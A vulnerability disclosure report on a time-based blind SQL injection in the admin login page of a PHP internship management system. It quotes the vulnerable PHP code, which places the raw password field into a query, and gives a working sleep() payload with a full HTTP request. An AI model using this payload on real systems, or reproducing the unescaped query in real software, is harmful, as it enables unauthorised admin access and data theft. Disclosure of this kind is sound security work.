## INTERNSHIP MANAGEMENT SYSTEM IN PHP WITH SOURCE CODE admin/login.php SQL Injection (time-based blind) Vulnerability

### I. Vulnerability Impact

An unauthenticated attacker can inject arbitrary SQL into the `password` parameter of the admin login form. Because the application returns no SQL errors, a time-based blind technique (e.g. `sleep()`) is used to confirm the injection and to extract data character by character from the `users` table (or any other table) by measuring response delays. Combined with the fact that the admin table stores credentials in plaintext, this can lead to full administrative takeover.

### II. Source Code Analysis

The vulnerability resides in `admin/login.php`, lines 41-42. The `password` parameter is taken directly from `$_POST` and concatenated into the query without any filtering, escaping, or prepared statements:

```php
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE password = '$password' AND email = '$email'";
$runSql = $db->query($sql);
$check_user = mysqli_num_rows($runSql);
```

Because the raw `$password` value is placed inside the SQL string, an attacker can break out of the quotes and append an expression such as `and (select sleep(2))`, which forces the database to pause for 2 seconds. The delayed response confirms that the injected SQL is executed.

### III. Payload

The core injection payload (URL-decoded, `+` represents a space) is:

```
password'and(select*from(select sleep(2))a/**/union/**/select 1)='
```

The transformed SQL after injection is:

```sql
SELECT * FROM users WHERE password = 'password'and(select*from(select sleep(2))a/**/union/**/select 1)='' AND email = 'asd'
```

HTTP request:

```http
POST /admin/login.php HTTP/1.1
Host: internship
Content-Length: 92
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0
Origin: http://internship
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://internship/admin/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=fd4fhj6g0hij9q5fdbvc6fanqt
Connection: keep-alive

email=asd&password=password'and(select*from(select+sleep(2))a/**/union/**/select+1)='&login=
```

Server response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
X-Powered-By: PHP/7.3.4
Content-Type: text/html; charset=UTF-8
```

The response arrives approximately 2 seconds after the request, confirming that `sleep(2)` executed on the database server and proving the time-based blind SQL injection.

### IV. Source Download

https://code-projects.org/internship-management-system-in-php-with-source-code/

![image-20260824110606209](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824110606209.png)
